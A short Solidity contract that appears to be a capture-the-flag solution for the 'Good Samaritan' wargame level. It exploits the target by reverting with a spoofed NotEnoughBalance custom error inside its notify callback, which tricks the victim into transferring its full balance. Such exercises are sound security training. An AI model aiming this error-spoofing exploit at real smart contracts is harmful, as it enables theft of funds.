//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import {GoodSamaritan, Wallet, Coin} from "./GoodSamaritan.sol";

contract GoodSamaritanAttack{
    GoodSamaritan victim;
    error NotEnoughBalance();
    constructor(address _v) payable{
        victim = GoodSamaritan(_v);
    }
    function attack() public {
        victim.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10){
            revert NotEnoughBalance();
        }
        
    }
}